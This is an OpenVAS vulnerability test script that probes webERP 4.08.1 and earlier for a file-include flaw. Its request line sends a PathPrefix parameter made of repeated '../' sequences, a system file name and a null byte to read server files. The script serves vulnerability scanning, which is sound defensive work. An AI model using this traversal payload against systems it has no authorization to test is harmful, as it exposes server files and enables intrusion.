###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_weberp_54236.nasl 3058 2016-04-14 10:45:44Z benallard $
#
# webERP Multiple Remote and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "webERP is prone to multiple remote and local file-include
vulnerabilities because it fails to sufficiently sanitize user-
supplied input.

An attacker may leverage these issues to execute arbitrary server-side
script code that resides on an affected computer or in a remote
location with the privileges of the web server process. This may
facilitate unauthorized access.

webERP 4.08.1 and prior are vulnerable.";


if (description)
{
 script_id(103505);
 script_bugtraq_id(54236);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_version ("$Revision: 3058 $");

 script_name("webERP Multiple Remote and Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54236");
 script_xref(name : "URL" , value : "http://www.weberp.org/HomePage");

 script_tag(name:"last_modification", value:"$Date: 2016-04-14 12:45:44 +0200 (Thu, 14 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-07-02 11:58:46 +0200 (Mon, 02 Jul 2012)");
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/webERP","/weberp","/erp",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/index.php?PathPrefix=",crap(data:"../",length:9*6),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }  
}

exit(0);
